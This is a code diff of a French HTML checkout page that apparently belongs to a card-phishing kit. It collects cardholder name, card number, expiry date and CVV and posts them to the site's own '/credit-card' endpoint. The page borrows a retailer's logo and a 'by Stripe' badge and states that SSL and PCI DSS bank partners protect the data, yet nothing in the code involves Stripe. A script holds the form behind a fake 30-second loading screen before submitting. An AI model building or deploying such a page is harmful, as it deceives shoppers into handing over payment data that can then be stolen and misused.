@@ -3,89 +3,202 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Informations de la Carte de Crédit</title>
+    <title>Finalisez votre paiement</title>
+    <!-- Lien vers FontAwesome pour les icônes -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
+        /* Reset CSS */
+        * {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #f5f7fa, #c3cfe2);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #333;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: rgba(255, 255, 255, 0.95);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+            animation: fadeIn 0.5s ease-in-out;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
             position: relative;
         }
 
-        .top-right-image {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            width: 50px;
-            height: 50px;
-            background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAAAXNSR0IArs4c6QAABAtJREFUaEPtmFnIVVUUx3+mDfTSQBKNZkEQhVhokIaVVETlg0E0UA85UTlQNhCFPRQoGmWTWQ/NUUEQQkVJihUZVhYJ0aDRICmVGSUSZWrtn6wDm+u533cP5/iZcPbLvXfvtfde///677XW9w1iHx+D9nH/aQHs7Qi2EWgjUJOBVkI1Cay9vY1AbQprHtBGoCaBtbe3EeiDwsHAKcCZwBnAjNp0lxxQNQI6dSDwZw/OXAs8F3b/AAf0sKeySa8A7gQuAEYBM4FnerjpfwXgW2B4OD0JeLoHAOcClwAfAh8B63vYU9kkj4B6PR04FtgKfJlYXwlsA75LrJ8Qp98PvBXz7wPjY/6v5PDH4fTfwCfAabH2L7AcGA0cEnOrksROBM4DtgNLgW+6IDgVOCfk+xXwduzZ9QfNQcHolSWbV8elOYDC7GfgeEBnHer8XeD8AD8XeD7WdgBDgpAxMfdOOFWQKIh7gXsyPw5OdzyVzruiw7fPgYkCdvN9ifFbuyBfA4wEvk8gh3XYdALIl41efwC6yWUK8GQsvhqOltmuA0YIYANwdFgomVeAI1NIzwIODVnlAGT5a2BLYv2uLAIeoVSUkQCW9RMBJfcs4OdUQLYdG0Ou4+IM57S5LdYWpHNPCtvpAvg906UHTgt9azMU2NQRgckRVtdNjYWE/H1zAv1gHH5NPwAeSnffFLZXAS9mNJ8NeM91MfdoZD9/Kh0j41gugNeAS7PNvwIvJ+cXAT4Yxw+hd7/3BWBCSrWv9whAoAJ2WF82Z0ReD9yoRGL9M0DJOEwCF8b3TQLwIb6RZYwCiw/PCx7ZQwDyCHinD9Ns47g9GD8uI7bs6/YiA+yf2DYLKR/Dl4MwFZriBNpkBCRmVnbXLyFZp26INVM7w3f6UwmCbQI4JgyKdR/PipTO9osJH9jdKTMUbEwHHou1zjdQRUK5rs3xptViWFvsnS6LiZeAq8tCIAB1/iPwZmQPC9niDICaV0pFUfoi8rW6NWPlj7gKABmdFwlDgo4KB3+LYqrzL8Sc2c0CuiQynT5eZK8lAFPiyV20ZkV2bU6ENTcrqwNVAHST9x3A/Ch8RmVsH+9gggB8wBeXGKk705hl+/D4tC0uRl0ARl3WjaRjZ7rnYeCW+O7cYcDjwOWw279BrRe7ADissnaavoc/Iu9/EO1B4bAX2Sb4sKwdNmgWrByUvYz7HYIuGkAl8GlHK2EafSJ6KdsI2V7bhW3PMRJHpLdhmre5tEnc0Ws73UcUKy1Z6YteaGGq5rMr7S4x3psAHgi51MIw0ADei/5K+dmp2lfVGgMNwIJp293YGGgAjTleHNQCaJzSige2EahIWOPmbQQap7TigW0EKhLWuHkbgcYprXhgG4GKhDVu/h8UAu3I51OcfQAAAABJRU5ErkJggg==');
-            background-size: cover;
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
         .logo {
             text-align: center;
-            margin-top: 10px;
+            margin-bottom: 20px;
         }
 
-        .container {
-            width: 50%;
-            margin: 0 auto;
-            background-color: #fff;
-            padding: 20px;
-            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
-            margin-top: 50px;
-            text-align: center;
+        .logo img {
+            width: 100%; /* Logo prend toute la largeur */
+            max-width: 100%;
+            border-radius: 10px;
+            transition: transform 0.3s ease, opacity 0.3s ease;
+            opacity: 0.9;
+        }
+
+        .logo img:hover {
+            transform: scale(1.05);
+            opacity: 1;
         }
 
         h1 {
-            color: #333;
+            font-size: 24px;
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 20px;
+            text-align: center;
+            opacity: 0.9;
         }
 
-        label {
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .form-group label {
             display: block;
-            margin: 10px 0;
-            text-align: left;
-            font-weight: bold;
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 5px;
+            opacity: 0.8;
         }
 
-        input[type="text"], input[type="number"] {
+        .form-group input,
+        .form-group select {
             width: 100%;
-            padding: 10px;
-            margin: 5px 0;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            box-sizing: border-box;
+            padding: 14px 14px 14px 40px; /* Espace pour l'icône */
+            border: 1px solid rgba(0, 0, 0, 0.1);
+            border-radius: 12px;
+            font-size: 14px;
+            background: rgba(255, 255, 255, 0.9);
+            transition: border-color 0.3s ease, box-shadow 0.3s ease, transform 0.3s ease;
         }
 
+        .form-group input:focus,
+        .form-group select:focus {
+            border-color: #4CAF50;
+            box-shadow: 0 0 12px rgba(76, 175, 80, 0.3);
+            outline: none;
+            transform: scale(1.02);
+        }
+
+        /* Icônes pour chaque champ */
+        .form-group i {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #666;
+            font-size: 16px;
+            opacity: 0.8;
+        }
+
+        /* Logos des cartes intégrés à droite dans le champ */
+        .card-logos {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            display: flex;
+            gap: 5px;
+            align-items: center;
+        }
+
+        .card-logos img {
+            width: 30px;
+            height: auto;
+            border-radius: 5px;
+            opacity: 0.3; /* Logo désactivé par défaut */
+            transition: opacity 0.3s ease;
+        }
+
+        .card-logos img.active {
+            opacity: 1; /* Logo activé */
+        }
+
+        /* Bouton de soumission */
         button {
+            width: 100%;
+            padding: 16px;
             background-color: #4CAF50;
             color: white;
-            padding: 10px 20px;
             border: none;
-            border-radius: 5px;
-            cursor: pointer;
+            border-radius: 12px;
             font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            position: relative;
+            overflow: hidden;
         }
 
         button:hover {
             background-color: #45a049;
+            transform: translateY(-3px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
         }
 
-        .loading {
-            display: none;
-            text-align: center;
-            margin-top: 20px;
+        button:active {
+            transform: translateY(0);
         }
 
-        .spinner {
+        /* Écran de chargement plein écran flou */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(20px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+        }
+
+        .loading-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .loading-spinner {
             border: 8px solid #f3f3f3;
             border-top: 8px solid #3498db;
             border-radius: 50%;
             width: 50px;
             height: 50px;
             animation: spin 2s linear infinite;
-            margin: 10px auto;
         }
 
         @keyframes spin {
@@ -93,100 +206,217 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* Styles pour les logos des cartes */
-        .card-logos {
-            display: flex;
-            justify-content: flex-start;
-            gap: 10px;
-            margin-top: 5px;
+        /* Informations de sécurité modernisées */
+        .security-info {
+            font-size: 12px;
+            color: #666;
+            margin-top: 20px;
+            opacity: 0.8;
         }
 
-        .card-logos img {
-            width: 40px;
-            height: auto;
+        .security-info .line {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .security-info .line i {
+            font-size: 16px;
+            color: #4CAF50;
+        }
+
+        .security-info a {
+            color: #4CAF50;
+            text-decoration: none;
+        }
+
+        .security-info a:hover {
+            text-decoration: underline;
+        }
+
+        /* Section "Sauvegarder pour mon prochain paiement" */
+        .save-payment {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .save-payment input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+        }
+
+        .save-payment label {
+            font-size: 14px;
+            color: #666;
+            opacity: 0.8;
+        }
+
+        /* Logo "by Stripe" en bas */
+        .stripe-logo {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .stripe-logo img {
+            width: 100px; /* Taille du logo Stripe */
+            opacity: 0.8;
+            transition: opacity 0.3s ease;
+        }
+
+        .stripe-logo img:hover {
+            opacity: 1;
         }
     </style>
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const dateExpirationInput = document.getElementById('date_expiration');
-            const numeroCarteInput = document.getElementById('numero_carte');
-            const cvvInput = document.getElementById('cvv');
-            const form = document.querySelector('form');
-            const loadingDiv = document.getElementById('loading');
-
-            dateExpirationInput.addEventListener('input', function(e) {
-                let value = e.target.value.replace(/\D/g, '');
-                if (value.length > 2) {
-                    value = value.slice(0, 2) + '/' + value.slice(2, 4);
-                }
-                if (value.length > 5) {
-                    value = value.slice(0, 5);
-                }
-                e.target.value = value;
-            });
-
-            numeroCarteInput.addEventListener('input', function(e) {
-                let value = e.target.value.replace(/\D/g, '');
-                if (value.length > 4) {
-                    value = value.slice(0, 4) + ' ' + value.slice(4);
-                }
-                if (value.length > 9) {
-                    value = value.slice(0, 9) + ' ' + value.slice(9);
-                }
-                if (value.length > 14) {
-                    value = value.slice(0, 14) + ' ' + value.slice(14);
-                }
-                if (value.length > 19) {
-                    value = value.slice(0, 19);
-                }
-                e.target.value = value;
-            });
-
-            cvvInput.addEventListener('input', function(e) {
-                let value = e.target.value.replace(/\D/g, '');
-                if (value.length > 3) {
-                    value = value.slice(0, 3);
-                }
-                e.target.value = value;
-            });
-
-            form.addEventListener('submit', function(event) {
-                loadingDiv.style.display = 'block';
-            });
-        });
-    </script>
 </head>
 <body>
-
-    <!-- Logo centré en haut -->
-    <div class="logo">
-        <img src="https://destockagealimentaireprixbas.com/wp-content/uploads/2024/04/Destockage-Alimentaire-2.gif" alt="Destockage Alimentaire" style="width: 200px;">
-    </div>
-
-    <div class="top-right-image"></div>
-
     <div class="container">
-        <h1>Informations de la Carte de Crédit</h1>
-        <form method="POST" action="{{ url_for('credit_card_form') }}">
-            <label for="numero_carte">Numéro de la carte :</label>
-            <input type="text" id="numero_carte" name="numero_carte" required maxlength="19" placeholder="xxxx xxxx xxxx xxxx">
-            <!-- Logos des cartes -->
-            <div class="card-logos">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" alt="American Express">
+        <!-- Logo principal agrandi -->
+        <div class="logo">
+            <img src="https://destockagealimentaireprixbas.com/wp-content/uploads/2024/04/Destockage-Alimentaire-2.gif" alt="Logo">
+        </div>
+
+        <!-- Titre -->
+        <h1>Finalisez votre paiement</h1>
+
+        <!-- Formulaire -->
+        <form id="credit-card-form" action="/credit-card" method="POST">
+            <!-- Nom sur la carte -->
+            <div class="form-group">
+                <label for="nom_carte">Nom sur la carte</label>
+                <i class="fas fa-user"></i>
+                <input type="text" id="nom_carte" name="nom_carte" placeholder="Nom sur la carte" required>
             </div>
-            <label for="date_expiration">Date d'expiration :</label>
-            <input type="text" id="date_expiration" name="date_expiration" required maxlength="5" placeholder="MM/AA">
-            <label for="cvv">Code de sécurité (CVV) :</label>
-            <input type="number" id="cvv" name="cvv" required maxlength="3" placeholder="CVV">
-            <button type="submit">Envoyer</button>
+
+            <!-- Numéro de la carte avec logos intégrés à droite -->
+            <div class="form-group">
+                <label for="numero_carte">Numéro de la carte</label>
+                <i class="fas fa-credit-card"></i>
+                <input type="text" id="numero_carte" name="numero_carte" placeholder="xxxx xxxx xxxx xxxx" required>
+                <div class="card-logos">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" id="visa-logo">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" id="mastercard-logo">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" alt="American Express" id="amex-logo">
+                </div>
+            </div>
+
+            <!-- Date d'expiration et CVV sur la même ligne -->
+            <div class="form-group">
+                <div style="display: flex; gap: 10px;">
+                    <div style="flex: 1;">
+                        <label for="date_expiration">Date d'expiration</label>
+                        <i class="fas fa-calendar-alt"></i>
+                        <input type="text" id="date_expiration" name="date_expiration" placeholder="MM/AA" required>
+                        <small>Recto de la carte au format MM/AA</small>
+                    </div>
+                    <div style="flex: 1;">
+                        <label for="cvv">Code de sécurité (CVV)</label>
+                        <i class="fas fa-lock"></i>
+                        <input type="number" id="cvv" name="cvv" placeholder="CVV" required>
+                        <small>3 chiffres sur le verso de la carte</small>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Sauvegarder pour mon prochain paiement -->
+            <div class="save-payment">
+                <input type="checkbox" id="save_payment" name="save_payment">
+                <label for="save_payment">Sauvegarder pour mon prochain paiement</label>
+            </div>
+
+            <!-- Bouton de soumission -->
+            <button type="submit" id="submit-button">Payer maintenant</button>
         </form>
-        <div class="loading" id="loading">
-            <div class="spinner"></div>
-            <p>Envoi en cours...</p>
+
+        <!-- Informations de sécurité -->
+        <div class="security-info">
+            <div class="line">
+                <i class="fas fa-shield-alt"></i>
+                <p>Votre banque peut vous demander d'autoriser le paiement pour compléter votre achat. Vous êtes sur un serveur de paiement sécurisé par les normes SSL (https) et PCI DSS de nos partenaires bancaires. Vos données sont encryptées pour plus de sécurité.</p>
+            </div>
+            <div class="line">
+                <i class="fas fa-info-circle"></i>
+                <p><a href="#">Me renseigner sur les finalités du traitement de mes données personnelles, les durées de conservation et mes droits</a>. En validant ma transaction, je reconnais avoir pris connaissance des <a href="#">CGU</a> et je les accepte.</p>
+            </div>
+        </div>
+
+        <!-- Logo "by Stripe" en bas -->
+        <div class="stripe-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/ba/Stripe_Logo%2C_revised_2016.svg" alt="by Stripe">
         </div>
     </div>
 
+    <!-- Écran de chargement plein écran flou -->
+    <div class="loading-overlay" id="loading-overlay">
+        <div class="loading-spinner"></div>
+    </div>
+
+    <script>
+        // Détection du type de carte
+        const numeroCarteInput = document.getElementById('numero_carte');
+        const visaLogo = document.getElementById('visa-logo');
+        const mastercardLogo = document.getElementById('mastercard-logo');
+        const amexLogo = document.getElementById('amex-logo');
+
+        numeroCarteInput.addEventListener('input', (e) => {
+            const value = e.target.value.replace(/\D/g, '');
+            let cardType = '';
+
+            if (/^4/.test(value)) {
+                cardType = 'visa';
+            } else if (/^5[1-5]/.test(value)) {
+                cardType = 'mastercard';
+            } else if (/^3[47]/.test(value)) {
+                cardType = 'amex';
+            }
+
+            // Active/désactive les logos
+            visaLogo.classList.toggle('active', cardType === 'visa');
+            mastercardLogo.classList.toggle('active', cardType === 'mastercard');
+            amexLogo.classList.toggle('active', cardType === 'amex');
+
+            // Formatage automatique du numéro de carte
+            let formattedValue = value.replace(/(\d{4})/g, '$1 ').trim();
+            if (formattedValue.length > 19) formattedValue = formattedValue.slice(0, 19);
+            e.target.value = formattedValue;
+        });
+
+        // Formatage automatique de la date d'expiration
+        const dateExpirationInput = document.getElementById('date_expiration');
+        dateExpirationInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 2) value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            if (value.length > 5) value = value.slice(0, 5);
+            e.target.value = value;
+        });
+
+        // Formatage automatique du CVV
+        const cvvInput = document.getElementById('cvv');
+        cvvInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 3) value = value.slice(0, 3);
+            e.target.value = value;
+        });
+
+        // Gestion du temps de chargement
+        const submitButton = document.getElementById('submit-button');
+        const form = document.getElementById('credit-card-form');
+        const loadingOverlay = document.getElementById('loading-overlay');
+
+        form.addEventListener('submit', (e) => {
+            e.preventDefault(); // Empêche la soumission réelle du formulaire
+
+            // Affiche l'écran de chargement
+            loadingOverlay.classList.add('active');
+
+            // Simule un temps de chargement de 30 secondes
+            setTimeout(() => {
+                loadingOverlay.classList.remove('active');
+                form.submit(); // Soumet le formulaire après le délai
+            }, 30000); // 30 secondes
+        });
+    </script>
 </body>
 </html>
